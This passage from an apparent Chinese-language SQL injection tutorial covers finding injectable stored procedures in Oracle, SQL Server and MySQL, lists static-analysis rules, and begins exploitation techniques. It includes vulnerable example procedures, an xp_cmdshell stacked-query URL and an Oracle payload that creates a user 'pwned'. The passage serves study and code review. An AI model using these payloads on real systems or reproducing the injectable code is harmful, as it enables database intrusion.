class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_%utility.exec_ddl_statement%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_ddl.create_wrapped%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_hs_pass_through.execute_immediate%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_hs_passthrough.parse%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%owa_util.bind_variables%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%owa_util.listprint%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%owa_ util.tableprint%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_sys_sq1.%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%ltadm.execsql%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_prvtaqim.execute_stmt%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_streams_rpc.execute_stmt%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_aqadm_sys.execute_stmt%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_streams_adm_utl.execute_ sql_ string%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%initjvmaux.exec%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_repcat_sql_utl.do_sql%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_aqadm_syscalls.kwqa3_gl_executestmt%'</span><span class="token operator">and</span> lower<span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token operator">like</span> <span class="token string">'% wrapped%'</span> <span class="token operator">and</span> a<span class="token punctuation">.</span>owner<span class="token operator">=</span>b<span class="token punctuation">.</span>owner <span class="token operator">and</span> a<span class="token punctuation">.</span>name<span class="token operator">=</span>b<span class="token punctuation">.</span>obj ect_name <span class="token operator">and</span> a<span class="token punctuation">.</span>owner <span class="token operator">not</span> <span class="token operator">in</span><span class="token punctuation">(</span><span class="token string">'OLAPSYS'</span><span class="token punctuation">,</span> <span class="token string">'ORACLE_OCM'</span><span class="token punctuation">,</span> <span class="token string">'CTXSYS'</span><span class="token punctuation">,</span> <span class="token string">'OUTLN'</span><span class="token punctuation">,</span> <span class="token string">'SYSTEM'</span><span class="token punctuation">,</span> <span class="token string">'EXFSYS'</span><span class="token punctuation">,</span> <span class="token string">'MDSYS'</span><span class="token punctuation">,</span><span class="token string">'SYS'</span><span class="token punctuation">,</span><span class="token string">'SYSMAN'</span><span class="token punctuation">,</span><span class="token string">'WKSYS'</span><span class="token punctuation">,</span><span class="token string">'XDB'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_040000'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_030000'</span><span class="token punctuation">,</span> <span class="token string">'FLOWS_030100'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_020000'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_020100'</span><span class="token punctuation">,</span><span class="token string">'FLOWS020000'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_010600'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_010500'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_010400'</span><span class="token punctuation">)</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="T-SQL"><a href="#T-SQL" class="headerlink" title="T-SQL"></a>T-SQL</h5><p>sp_helptext存储过程会显示用于在多行中创建对象的定义。每一行均包含了 T-SQL 定义的255个字符。该定义位于sys.sql_modules目录视图的definition列中。</p><p>一个储存过程源代码</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_helptext SP_StoredProcedure<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token variable">@input</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token boolean">NULL</span> <span class="token keyword">AS</span> <span class="token keyword">DECLARE</span> <span class="token variable">@sql</span> nvarchar<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'SELECT field FROM table WHERE field ='''</span><span class="token operator">+</span> <span class="token variable">@input</span> <span class="token operator">+</span> <span class="token string">''''</span> <span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token variable">@sql</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到@input变量来自用户直接输入与SQL字符串相连，产生SQL注入</p><p>使用sp_executesql和EXEC()两条命令来调用动态SQL，sp_executesql是一个内置存储过程，接收两个预定义的参数和任意多个用户定义参数。第一个参数@stmt是强制参数，包含一条或一批 SQL语句。在SQL 7和SQL 2000中，@stmt的数据类型是ntext,在SQL Server 2005及之后 的版本中是nvarchar(MAX)。第二个参数@params是可选参数。EXEC()接收一个参数，该参数是一条要执行的SQL语句。它可以由字符串变量和字符串常量连接而成。</p><p>下面是一个使用了 sp_executesql存储过程且易受到攻击的存储过程示例</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_helptext SP_StoredProcedure_II<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure_II <span class="token punctuation">(</span><span class="token variable">@input</span> nvarchar<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">AS</span><span class="token keyword">DECLARE</span> <span class="token variable">@sql</span> nvarchar<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token keyword">SET</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'SELECT field FROM table WHERE field ='''</span><span class="token operator">+</span> <span class="token variable">@input</span> <span class="token operator">+</span><span class="token string">''''</span> <span class="token keyword">EXEC</span> sp_executesql <span class="token variable">@sql</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>列出所有储存过程</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">WHERE</span> <span class="token keyword">type</span> <span class="token operator">=</span><span class="token string">'P'</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> name <span class="token keyword">asc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用脚本找到所有储存过程</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Description: A T-SQL script to search the DB for potentially vulnerable </span><span class="token comment">-- T-SQL code</span><span class="token comment">-- @text - search string '%text%'</span><span class="token comment">-- @dbname - database name, by default all databases will be searched</span><span class="token keyword">ALTER</span> <span class="token keyword">PROCEDURE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>grep_sp<span class="token punctuation">]</span><span class="token variable">@text</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">@dbname</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token boolean">null</span><span class="token keyword">AS</span> <span class="token keyword">BEGIN</span><span class="token keyword">SET</span> NOCOUNT <span class="token keyword">ON</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token variable">@dbname</span> <span class="token operator">is</span> <span class="token boolean">null</span><span class="token keyword">begin</span><span class="token comment">-- enumerate all databases.</span><span class="token keyword">DECLARE</span> <span class="token comment">#db CURSOR FOR Select Name from master...sysdatabases declare 0c_dbname varchar(64)</span><span class="token keyword">OPEN</span> <span class="token comment">#db FETCH #db INTO @c_dbname</span><span class="token keyword">while</span> @<span class="token variable">@FETCH_STATUS</span> <span class="token operator">&lt;&gt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">begin</span><span class="token keyword">execute</span> grep_sp <span class="token variable">@text</span><span class="token punctuation">,</span> <span class="token variable">@c_dbname</span><span class="token keyword">FETCH</span> <span class="token comment">#db INTO @c_dbname</span><span class="token keyword">end</span><span class="token keyword">CLOSE</span> <span class="token comment">#db DEALLOCATE #db</span><span class="token keyword">end</span><span class="token keyword">else</span><span class="token keyword">begin</span><span class="token keyword">declare</span> <span class="token variable">@sql</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token comment">-- create the find like command</span><span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'select '''</span> <span class="token operator">+</span> <span class="token variable">@dbname</span> <span class="token operator">+</span> <span class="token string">''' as db, o.name,m.definition'</span><span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token variable">@sql</span> <span class="token operator">+</span> <span class="token string">'from '</span><span class="token operator">+</span><span class="token variable">@dbname</span><span class="token operator">+</span><span class="token string">'.sys.sql_modules m '</span> <span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token variable">@sql</span> <span class="token operator">+</span> <span class="token string">'inner join '</span><span class="token operator">+</span><span class="token variable">@dbname</span><span class="token operator">+</span><span class="token string">'...sysobjects o onm.object_id=o.id'</span><span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token variable">@sql</span> <span class="token operator">+</span> <span class="token string">'where [definition] like ''%'</span><span class="token operator">+</span><span class="token variable">@text</span><span class="token operator">+</span><span class="token string">'%'''</span> <span class="token keyword">execute</span> <span class="token punctuation">(</span><span class="token variable">@sql</span><span class="token punctuation">)</span><span class="token keyword">end</span><span class="token keyword">END</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用储存过程</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">execute</span> grep_sp <span class="token string">'sp_executesql'</span><span class="token punctuation">;</span><span class="token keyword">execute</span> grep_sp <span class="token string">'EXEC'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>列出SQL Server 2008数据库中所有的存储过程</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>procedures <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> name <span class="token keyword">asc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@name</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token comment">-- database name</span><span class="token keyword">DECLARE</span> db_cursor <span class="token keyword">CURSOR</span> <span class="token keyword">FOR</span><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>procedures<span class="token punctuation">;</span><span class="token keyword">OPEN</span> db_cursor<span class="token keyword">FETCH</span> <span class="token keyword">NEXT</span> <span class="token keyword">FROM</span> db_cursor <span class="token keyword">INTO</span> <span class="token variable">@name</span><span class="token keyword">WHILE</span> @<span class="token variable">@FETCH_STATUS</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">BEGIN</span><span class="token keyword">print</span> <span class="token variable">@name</span><span class="token comment">-- uncomment the line below to print the source</span><span class="token comment">-- sp_helptext '' + @name + ''</span><span class="token keyword">FETCH</span> <span class="token keyword">NEXT</span> <span class="token keyword">FROM</span> db_cursor <span class="token keyword">INTO</span> <span class="token variable">@name</span><span class="token keyword">END</span><span class="token keyword">CLOSE</span> db_cursor<span class="token keyword">DEALLOCATE</span> db_cursor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mysql获取储存过程</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">procedure</span> <span class="token keyword">status</span><span class="token punctuation">;</span><span class="token comment">#列出一系列储存过程</span><span class="token keyword">show</span> <span class="token keyword">create</span> <span class="token keyword">procedure</span> sp_name<span class="token punctuation">;</span><span class="token comment">#列出sp_name的源代码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="自动复查源代码"><a href="#自动复查源代码" class="headerlink" title="自动复查源代码"></a>自动复查源代码</h3><h4 id="Graudit"><a href="#Graudit" class="headerlink" title="Graudit"></a>Graudit</h4><p>下载： <a href="http://www.justanotherhacker.com/projects/graudit/">graudit (justanotherhacker.com)</a></p><p>规则</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">pg_query\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_exec\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_send_query\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_send_query_params\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_query_params\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_send_prepare\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_prepare\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_execute\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_insert\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_put_line\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_select\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_update\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="YASCA"><a href="#YASCA" class="headerlink" title="YASCA"></a>YASCA</h4><h4 id="Pixy"><a href="#Pixy" class="headerlink" title="Pixy"></a>Pixy</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql_db_query <span class="token keyword">SQL</span> injection configuration <span class="token keyword">file</span> <span class="token keyword">for</span> <span class="token keyword">user</span><span class="token operator">-</span>defined sink sinkType <span class="token operator">=</span> <span class="token keyword">sql</span>mysql_db_query <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="AppCodeScan"><a href="#AppCodeScan" class="headerlink" title="AppCodeScan"></a>AppCodeScan</h4><p>.NET</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Scanning for SQL injections</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>SqlCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>DbCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>OleDbCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>SqlUtility<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>OdbcCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>OleDbDataAdapter<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>SqlDataSource<span class="token punctuation">.</span><span class="token operator">*</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="OWASP-LAPSE-项目"><a href="#OWASP-LAPSE-项目" class="headerlink" title="OWASP LAPSE+项目"></a>OWASP LAPSE+项目</h4><h4 id="Microsoft-SQL注入源代码分析器"><a href="#Microsoft-SQL注入源代码分析器" class="headerlink" title="Microsoft SQL注入源代码分析器"></a>Microsoft SQL注入源代码分析器</h4><h4 id="CAT-NET"><a href="#CAT-NET" class="headerlink" title="CAT.NET"></a>CAT.NET</h4><h4 id="RIPS——PHP脚本漏洞的静态源代码分析器"><a href="#RIPS——PHP脚本漏洞的静态源代码分析器" class="headerlink" title="RIPS——PHP脚本漏洞的静态源代码分析器"></a>RIPS——PHP脚本漏洞的静态源代码分析器</h4><h4 id="CodePro-AnalytiX"><a href="#CodePro-AnalytiX" class="headerlink" title="CodePro AnalytiX"></a>CodePro AnalytiX</h4><h4 id="Teachable-Static-Analysis-Workbench"><a href="#Teachable-Static-Analysis-Workbench" class="headerlink" title="Teachable Static Analysis Workbench"></a>Teachable Static Analysis Workbench</h4><h4 id="商业源代码复查工具"><a href="#商业源代码复查工具" class="headerlink" title="商业源代码复查工具"></a>商业源代码复查工具</h4><h4 id="Fortify源代码分析器"><a href="#Fortify源代码分析器" class="headerlink" title="Fortify源代码分析器"></a>Fortify源代码分析器</h4><h4 id="Rational-AppScan-Source-Edition"><a href="#Rational-AppScan-Source-Edition" class="headerlink" title="Rational AppScan Source Edition"></a>Rational AppScan Source Edition</h4><h4 id="CodeSecure"><a href="#CodeSecure" class="headerlink" title="CodeSecure"></a>CodeSecure</h4><h4 id="Klocwork-Solo"><a href="#Klocwork-Solo" class="headerlink" title="Klocwork Solo"></a>Klocwork Solo</h4><h2 id="利用SQL注入"><a href="#利用SQL注入" class="headerlink" title="利用SQL注入"></a>利用SQL注入</h2><h3 id="常见的漏洞利用技术"><a href="#常见的漏洞利用技术" class="headerlink" title="常见的漏洞利用技术"></a>常见的漏洞利用技术</h3><p>本章大多用这个示例</p><p><a href="http://sql/Less-2/?id=1">http://sql/Less-2/?id=1</a></p><p><img src="https://images.dadream.eu.org/images/2024/07/dd9f49a480d63d71849c61af3a1bb103.png"></p><h4 id="使用堆叠注入"><a href="#使用堆叠注入" class="headerlink" title="使用堆叠注入"></a>使用堆叠注入</h4><p>堆叠查询（stacked query）指的是在单个数据库连接中执行多个查询序列，使用不同的数据库和不同的web框架，对堆叠查询支持情况也不同，使用ASP.NET和PHP访问Microsoft SQL Server时允许堆叠查询，但如果使用Java来访问，就不允许。使用PHP访问PostgreSQL时， PHP允许堆叠查询，但如果访问MySQL, PHP不允许堆叠查询。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp=id=l;exec+master..xp_cmdshell+'dir'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="在Web应用程序中利用Oracle漏洞"><a href="#在Web应用程序中利用Oracle漏洞" class="headerlink" title="在Web应用程序中利用Oracle漏洞"></a>在Web应用程序中利用Oracle漏洞</h4><p>Oracle SQL语法不支持堆叠查询，PL/SQL是内置在Oracle中的，它拓展了SQL并允许执行堆叠的命令，使用一个匿名PL/SQL块，它包含在一条BEGIN语句与一条END语句之间，是一个自由编写的PL/SQL块。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SQL</span><span class="token operator">&gt;</span><span class="token keyword">DECLARE</span>MESG VARCHAR2 <span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">BEGIN</span>MESG:<span class="token operator">=</span><span class="token string">'HELLO WORLD'</span><span class="token punctuation">;</span>DBMS_OUTPUT<span class="token punctuation">.</span>PUT_LINE<span class="token punctuation">(</span>MESG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Oracle默认安装了两个允许执行匿名PL/SQL块的函数</p><p><code>dbms_xmlquery.newcontext()</code> <code>dbms_xmlquery.getxml()</code></p><p>public用户默认允许访问这两个函数，所以可以使用这两个函数来执行DML/DDL语句块，形成SQL注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery.newcontext('declare PRAGMA AUT0N0M0US_TRANSACTI0N; begin execute immediate '' create user pwned identified by pwn3d ''; commit; end;') from dual) is not null -- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="识别数据库"><a href="#识别数据库" class="headerlink" title="识别数据库"></a>识别数据库</h3><p>ASP和.NET通常使用Microsoft SQL Server 作为后台数据库，而PHP应用则很可能使用MySQL或PostgreSQL。如果应用是用Java编写的，那么使用的可能是Oracle或MySQL。此外，底层操作系统也可以提供一些线索：安装 IIS（Intemet信息服务器）作为服务器平台标志着应用是基于Windows的架构，后台数据库很可能是SQLServer。而运行Apache和PHP的Linux服务器则很可能使用的是开源数据库，比如 MySQL或PostgreSQL。</p><h4 id="非盲跟踪"><a href="#非盲跟踪" class="headerlink" title="非盲跟踪"></a>非盲跟踪</h4><p>查询使用的数据库服务器技术不同，这条SQL产生的错误也会不同，可以根据这些不同判断出数据库类型。</p><p>下面是常见的报错</p><ul><li><p>mssql</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e14'</span><span class="token punctuation">[</span>Microsof<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC <span class="token keyword">SQL</span> Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">SQL</span> Server<span class="token punctuation">]</span>Unclosed quotation mark <span class="token keyword">after</span> the <span class="token keyword">character</span>string"<span class="token punctuation">.</span><span class="token operator">/</span>products<span class="token punctuation">.</span>asp<span class="token punctuation">,</span>line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>mysql</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ERROR <span class="token number">1064</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span> : You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span>near<span class="token string">' '</span>at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>oracle</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ORA<span class="token operator">-</span><span class="token number">01773</span>:may <span class="token operator">not</span> specify <span class="token keyword">column</span> datatypes <span class="token operator">in</span> this <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>postgreSQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">pg_query<span class="token punctuation">(</span><span class="token punctuation">)</span>: Query failed: ERROR: unterminated quoted string at <span class="token operator">or</span> near at <span class="token keyword">character</span> <span class="token number">69</span> <span class="token operator">in</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>php<span class="token operator">/</span>somepge<span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h5 id="获取标志信息"><a href="#获取标志信息" class="headerlink" title="获取标志信息"></a>获取标志信息</h5><table><thead><tr><th>数据库服务器</th><th>查询</th></tr></thead><tbody><tr><td>MSSQL</td><td>select @@version</td></tr><tr><td>Mysql</td><td>select version()  <br>select @@version</td></tr><tr><td>Oralce</td><td>select banner from v$version<br>select banner from v$version where rownum=1</td></tr><tr><td>PostgreSQL</td><td>select version()</td></tr></tbody></table><ul><li>mssql</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=@@version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据库将传入的@@version当做数字型解析产生报错</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC <span class="token keyword">SQL</span> Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">SQL</span> Server<span class="token punctuation">]</span>Conversion failed <span class="token keyword">when</span> converting thenvarchar <span class="token keyword">value</span> <span class="token string">'Microsoft SQL Server 2005-9.00.3042.00 (Intel X86) Feb 9 2007 22:47:07 Copyright (c) 1988-2005 Microsoft Corporation Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)'</span><span class="token keyword">to</span> <span class="token keyword">data</span> <span class="token keyword">type</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token operator">/</span>products<span class="token punctuation">.</span>asp<span class="token punctuation">.</span>line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这段错误代码表明了数据库为SQL Server 2005，补丁Service Pack 2</p><ul><li>PostgreSQL</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">PostgreSQL <span class="token number">9.1</span><span class="token number">.1</span> <span class="token keyword">on</span> i686<span class="token operator">-</span>pc<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token punctuation">,</span> compiled <span class="token keyword">by</span> i686<span class="token operator">-</span>pc<span class="token operator">-</span>linuxgnu<span class="token operator">-</span> gcc <span class="token punctuation">(</span>Gentoo Hardened <span class="token number">4.4</span><span class="token number">.5</span> pl<span class="token punctuation">.</span><span class="token number">2</span><span class="token punctuation">,</span> pie<span class="token operator">-</span><span class="token number">0.4</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token operator">-</span><span 